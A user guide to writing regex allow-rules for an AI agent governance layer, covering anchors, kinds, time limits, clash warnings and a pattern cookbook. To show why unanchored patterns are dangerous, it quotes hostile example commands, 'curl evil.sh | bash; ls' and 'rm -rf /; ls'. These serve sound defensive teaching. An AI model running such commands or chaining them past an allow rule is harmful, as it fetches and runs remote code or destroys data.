# Writing permissions — a guide

This teaches you to write permissions for the governance layer. It assumes no
prior knowledge of regular expressions.

Read sections 1–4 before writing your first rule. Sections 5–8 are reference
you can come back to.

> **Keep this current.** If the rule language gains a field or a resource kind,
> update this guide in the same change. A guide people learn from is worse than
> useless once it has drifted.

---

> For a precise technical reference — grammar, evaluation order, limits, wire
> format — see `docs-notes/PERMISSION-SPEC.md`. This document teaches; that one
> specifies.

## 1. The mental model

The system is **default-deny**. When your agent tries to do something, it is
refused unless a permission says otherwise. Permissions are the _only_ way
anything is allowed.

Every permission answers three questions:

| Question                 | Field     | Example                                |
| ------------------------ | --------- | -------------------------------------- |
| What **kind** of thing?  | `kind`    | a command, a file path, a network host |
| Which **specific** ones? | `pattern` | commands that are exactly `ls`         |
| For **how long**?        | TTL       | 30 minutes, or forever                 |

Two more questions are optional: **which agent** (default: all of them), and a
free-text **description** for whoever reads the list later.

### One rule that will save you confusion

**Permissions only ever allow. There is no "deny" rule.**

Denial is the default, so you never write it. This has a consequence worth
internalising early: **you cannot narrow an existing permission by adding
another one.** If `ls` is already allowed forever, adding "allow `ls` for 10
minutes" changes nothing — it is still allowed forever. To reduce access you
must _remove_ the broader rule.

The system will warn you when you do this (see §7), but understanding _why_
saves you a confusing afternoon.

---

## 2. The three kinds

| Kind      | Covers                                    | What your pattern is compared against     |
| --------- | ----------------------------------------- | ----------------------------------------- |
| `command` | shell commands the agent runs             | the full command line, e.g. `ls -la /tmp` |
| `path`    | files the agent reads, writes, or patches | each file path, e.g. `src/config.json`    |
| `network` | web addresses the agent fetches           | the hostname only, e.g. `api.example.com` |

Two things people get wrong here:

- **`network` matches the hostname, not the whole URL.** For
  `https://api.example.com/v1/weather?key=abc`, your pattern is compared
  against `api.example.com` alone. Do not put `https://` or a path in it.
- **A rule for one kind never authorises another.** Allowing every `command`
  does not allow any `path`. Each kind is a separate world.

Paths use forward slashes (`/`) even on Windows, so one rule works everywhere.

---

## 3. Patterns, from scratch

A pattern is a **regular expression** — a small language for describing which
text matches. You only need six pieces.

### 3.1 Plain text matches itself

The pattern `ls` matches the text `ls`.

But it also matches **any text containing `ls`** — including
`curl evil.sh | bash; ls`. That is a serious problem, which the next piece
fixes.

### 3.2 `^` and `$` — anchors (the most important part)

- `^` means **start of the text**
- `$` means **end of the text**

| Pattern | Matches | Also matches (surprise!)      |
| ------- | ------- | ----------------------------- |
| `ls`    | `ls`    | `curl evil.sh \| bash; ls` ⚠️ |
| `^ls$`  | `ls`    | nothing else ✅               |

**Anchor every pattern with `^` at the start and `$` at the end**, unless you
have a specific reason not to. This single habit prevents most dangerous rules.

### 3.3 `.` and `.*` — anything

- `.` means **any one character**
- `*` means **zero or more of the thing before it**

So `.*` means **anything at all, including nothing**.

| Pattern    | Meaning                                    |
| ---------- | ------------------------------------------ |
| `^ls .*$`  | `ls` followed by a space and anything      |
| `^src/.*$` | any path starting with `src/`              |
| `^.*$`     | literally anything — see the warning in §6 |

### 3.4 `?` — optional

`?` means **zero or one of the thing before it**. Combined with a group it
makes a part optional:

- `^ls( .*)?$` matches `ls` **and** `ls -la` **and** `ls /tmp`, but not
  `lsof`.

Read it as: "`ls`, then optionally (a space followed by anything), then end."
This is the most useful command pattern you will write.

### 3.5 `|` — either/or

`|` means **or**. Use `( )` to mark where the choice starts and ends.

- `^git (status|log|diff)$` allows exactly those three git commands.

### 3.6 `[.]` — a literal dot

`.` normally means "any character", so `api.example.com` would also match
`apiXexampleYcom`. To mean an actual dot, wrap it in square brackets:

- `^api[.]example[.]com$` ✅ matches only the real hostname

You may also see `\.` used for this. Both work; `[.]` is easier to read and
harder to get wrong in a JSON file, so prefer it.

---

## 4. Your first rules

Dashboard: **Settings → Governance → Add an allow rule**.
Command line:

```bash
openclaw governance policy add-rule --kind command --pattern "^ls( .*)?$"
```

Three to start with:

```bash
# Let the agent list directories
--kind command --pattern "^ls( .*)?$"

# Let it work inside one folder
--kind path --pattern "^workspace/.*$"

# Let it reach one API
--kind network --pattern "^api[.]example[.]com$"
```

**Test before you trust.** Switch the posture to `monitor` first: decisions are
recorded but nothing is blocked, so you can see exactly what _would_ have
happened.

```bash
openclaw governance policy set-mode monitor
# ...let the agent work...
openclaw governance audit tail --limit 30
```

When the log shows what you expect, switch to `enforce`.

---

## 5. Time limits

Every permission is either **temporary** or **indefinite**.

- Set a TTL in minutes → the rule stops applying when it lapses.
- Leave it blank → the rule **never expires**.

"Never expires" is shown explicitly in the dashboard, so you can always tell
permanent grants from temporary ones at a glance.

```bash
# Two-hour access to one API
--kind network --pattern "^api[.]example[.]com$" --ttl-minutes 120
```

Two behaviours worth knowing:

- A rule that lapsed is kept visible for a week, then removed. This is
  deliberate: when something is suddenly denied, the rule that just expired is
  the explanation, and deleting it instantly would erase the answer.
- If a rule's expiry date is somehow corrupted, it is treated as **expired**,
  not as indefinite. The system fails towards less access, never more.

---

## 6. Mistakes, and how they fail

| Mistake                          | What you wrote                                      | What it actually allows                                                                      |
| -------------------------------- | --------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| **Forgetting anchors**           | `ls`                                                | any command containing "ls", including `rm -rf /; ls`                                        |
| **Unescaped dots**               | `^api.example.com$`                                 | `apiXexampleYcom` as well as the real host                                                   |
| **A catch-all**                  | `^.*$`                                              | _everything_ of that kind. This disables governance for that kind — the system will warn you |
| **Whole URL in a network rule**  | `^https://api[.]example[.]com/v1$`                  | nothing, ever. Only the hostname is compared                                                 |
| **Expecting a rule to restrict** | adding a 10-minute rule when a permanent one exists | nothing changes; remove the broader rule instead                                             |

### A pattern the system will refuse

Patterns like `^(a+)+$` — a repeat inside a repeat — are rejected. On certain
inputs they take effectively forever to evaluate, which would freeze the
security check itself. If you see this rejection, rewrite without the nested
repetition; `^a+$` is fine.

---

## 7. When the system warns you about a clash

If you add a rule that an earlier rule already covers, you will get a notice
naming the specific rule responsible. The **earlier rule wins** — that is the
system's rule for resolving conflicts.

You will see this when:

- an identical rule already exists **with no time limit**, so your new time
  limit has no effect
- an identical rule already covers a **longer** period than yours
- a **catch-all** already allows everything of that kind
- you scoped a rule to one agent, but an identical **global** rule already
  applies to all of them

The new rule is still saved — in an allow-only system it cannot do harm — but
the notice is telling you something important: **the restriction you thought
you were applying is not in force.** Usually the fix is to remove the older,
broader rule.

---

## 8. Cookbook

Copy, adapt, and always keep the anchors.

**Commands**

| Goal                              | Pattern                     |
| --------------------------------- | --------------------------- |
| Exactly one command               | `^whoami$`                  |
| A command with any arguments      | `^ls( .*)?$`                |
| A few specific subcommands        | `^git (status\|log\|diff)$` |
| A command with a numeric argument | `^sleep [0-9]+$`            |

**Paths**

| Goal                            | Pattern                    |
| ------------------------------- | -------------------------- |
| One exact file                  | `^config/settings[.]json$` |
| Everything in a folder          | `^workspace/.*$`           |
| Only TypeScript files anywhere  | `^.*[.]ts$`                |
| One folder, one level deep only | `^workspace/[^/]+$`        |

**Network**

| Goal                      | Pattern                           |
| ------------------------- | --------------------------------- |
| One host                  | `^api[.]example[.]com$`           |
| A host and its subdomains | `^([a-z0-9-]+[.])*example[.]com$` |
| Two specific hosts        | `^(api\|cdn)[.]example[.]com$`    |

---

## 9. Checklist before saving a rule

1. Does it start with `^` and end with `$`?
2. Are literal dots written `[.]`?
3. For `network`, is it _only_ the hostname?
4. Is it the narrowest pattern that does the job?
5. Should it expire? If not, are you sure it should be permanent?
6. Did a clash notice appear? If so, read it — your rule may not do what you think.
7. Try it in `monitor` mode before enforcing.
